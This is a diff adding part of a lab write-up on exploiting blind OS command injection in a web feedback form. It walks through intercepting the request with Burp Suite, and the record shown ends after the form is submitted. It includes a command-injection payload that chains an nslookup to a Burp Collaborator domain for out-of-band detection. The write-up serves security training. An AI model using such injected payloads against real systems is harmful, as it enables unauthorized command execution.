@@ -95,3 +95,54 @@
 <br />
 
 <h2></h2>
+
+<h2>Lab Description:</h2>
+
+This lab contains a blind OS command injection vulnerability in the feedback function.
+
+The application executes a shell command containing the user-supplied details. The command is executed asynchronously and has no effect on the application's response. It is not possible to redirect output into a location that you can access. However, you can trigger out-of-band interactions with an external domain.
+
+
+<h2>Lab Solution</h2>
+
+The target goal: Exploit blind OS command injection to issue a DNS lookup to Burp Collaborator.
+
+Analysis: "& nslookup zorh37nyfzjbsg1nog7j9ml6zx5ntc.burpcollaborator.net #".
+
+- It is not possible to redirect output into a location that you can access.
+
+
+<h2></h2>
+
+- Navigate to Burp Suite turn Intercept On by clicking on "Intercept is off".
+
+<p align="center">
+<br/>
+<img src="https://i.imgur.com/YzGDBNL.png" height="90%" width="90%" alt=""/>
+<br />
+
+- Navigate to the Intercept Browser, click on "Submit feedback".
+
+<p align="center">
+<br/>
+<img src="https://i.imgur.com/UtNu6mG.png" height="90%" width="90%" alt=""/>
+<br />
+
+- Navigate back to Burp Suite turn Intercept On by clicking on "Intercept is on".
+
+<p align="center">
+<br/>
+<img src="https://i.imgur.com/ysjlWSa.png" height="90%" width="90%" alt=""/>
+<br />
+
+- Navigate back to the Intercept Browser, fill in the "Submit feedback".
+  - Name: "test".
+  - Email: "test@test.ca".
+  - Subject: "test".
+  - Message: "test".
+- Click on "Submit feedback".
+
+<p align="center">
+<br/>
+<img src="https://i.imgur.com/t23Mf8B.png" height="90%" width="90%" alt=""/>
+<br />
